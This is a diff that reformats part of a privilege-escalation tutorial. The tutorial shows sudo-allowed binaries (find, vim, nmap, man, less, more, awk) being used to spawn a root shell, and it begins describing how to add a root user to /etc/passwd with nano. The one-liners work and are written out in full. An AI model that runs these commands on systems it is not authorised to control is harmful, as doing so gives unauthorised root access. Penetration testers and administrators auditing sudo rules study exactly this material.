@@ -40,35 +40,40 @@ Here sudo -l, Shows the user has all this binary allowed to do as on root user w
 Let’s take a look at all binary one by one (which is mention in index only) and Escalate Privilege to root user.
 
 Using Find Command
-sudo find /etc/passwd -exec /bin/sh \;
-or
 
-sudo find /bin -name nano -exec /bin/sh \;
+    sudo find /etc/passwd -exec /bin/sh \;
+    or
+
+    sudo find /bin -name nano -exec /bin/sh \;
+
 Using Vim Command
-sudo vim -c '!sh'
+    sudo vim -c '!sh'
 Using Nmap Command
 Old way.
 
-  sudo nmap --interactive
-  nmap> !sh
-  sh-4.1#
-  Note : nmap –interactive option not available in latest nmap.
+    sudo nmap --interactive
+    nmap> !sh
+    sh-4.1#
+    Note : nmap –interactive option not available in latest nmap.
 
 Latest Way without –interactive
 
-echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+    echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+
+
 Using Man Command
-sudo man man
+    sudo man man
 after that press !sh and hit enter
 
 Using Less/More Command
-sudo less /etc/hosts
-sudo more /etc/hosts
-after that press !sh and hit enter
+
+    sudo less /etc/hosts
+    sudo more /etc/hosts
+    after that press !sh and hit enter
 
 Using awk Command
 
- sudo awk 'BEGIN {system("/bin/sh")}'
+    sudo awk 'BEGIN {system("/bin/sh")}'
  
 Using nano Command
 nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.
